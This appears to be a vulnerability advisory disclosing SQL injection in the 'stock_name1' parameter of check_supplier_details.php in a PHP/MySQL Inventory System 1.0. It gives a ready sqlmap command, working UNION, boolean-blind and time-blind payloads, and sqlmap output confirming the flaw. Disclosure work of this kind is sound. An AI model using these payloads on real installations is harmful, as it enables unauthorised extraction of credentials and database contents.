# SQL Injection in Inventory System (Check Supplier Details)

## Overview

* **Vulnerability Type**: SQL Injection (UNION-based / Blind)
* **Product**: [Inventory System](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
* **Version**: 1.0
* **Component**: Check Supplier Details (`check_supplier_details.php`)
* **Vulnerable Parameter**: `stock_name1` (POST)

## Description

A SQL Injection vulnerability exists in the **Inventory System**. The vulnerability is located in the `check_supplier_details.php` file.

The application fails to properly sanitize the `stock_name1` parameter in the HTTP POST request (typically used for verifying supplier existence). This allows an authenticated attacker to inject arbitrary SQL commands. Since the backend database is **MySQL** and the injection point allows for **UNION queries**, attackers can directly retrieve and display sensitive data from the database, in addition to using blind injection techniques.

## Steps to Reproduce

1. **Setup**: Deploy the Inventory System locally.
2. **Login**: Log in to the application.
3. **Exploit**: Send a crafted HTTP POST request to `check_supplier_details.php` with the malicious payload, or use `sqlmap`.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8089/check_supplier_details.php" \
--data "stock_name1=Test+Supplier" \
--batch -v 6 --risk=3 \
--cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**UNION Query Payload (MySQL):**

```sql
stock_name1=Test Supplier' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71716b7171,0x49785943476c514266495a6d73764652796e6f66566c5a645a4c546c686d6c487056727754727353,0x716b626b71),NULL,NULL#

```

**Boolean-based Blind Payload:**

```sql
stock_name1=Test Supplier' OR NOT 2722=2722#

```

**Time-based Blind Payload:**

```sql
stock_name1=Test Supplier' AND (SELECT 6459 FROM (SELECT(SLEEP(5)))ViNT)-- fojh

```

## Proof of Concept

The following output from `sqlmap` confirms that the `stock_name1` parameter is vulnerable to UNION-based, Boolean-based, and Time-based SQL injection.

```text
Parameter: stock_name1 (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: stock_name1=Test Supplier' OR NOT 2722=2722#
    Vector: OR NOT [INFERENCE]#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: stock_name1=Test Supplier' AND (SELECT 6459 FROM (SELECT(SLEEP(5)))ViNT)-- fojh
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: MySQL UNION query (NULL) - 6 columns
    Payload: stock_name1=Test Supplier' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71716b7171,0x49785943476c514266495a6d73764652796e6f66566c5a645a4c546c686d6c487056727754727353,0x716b626b71),NULL,NULL#
    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY],NULL,NULL#
---
[INFO] the back-end DBMS is MySQL

```
<img width="1025" height="389" alt="图片" src="https://github.com/user-attachments/assets/a07aaeae-e075-4251-9bb4-e8bcdfe1f85c" />


## Impact

This vulnerability allows an attacker to:

1. **Exfiltrate Data**: Directly retrieve and display database content (supplier information, credentials) via UNION-based attacks.
2. **Database Enumeration**: Identify tables, columns, and database schema.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
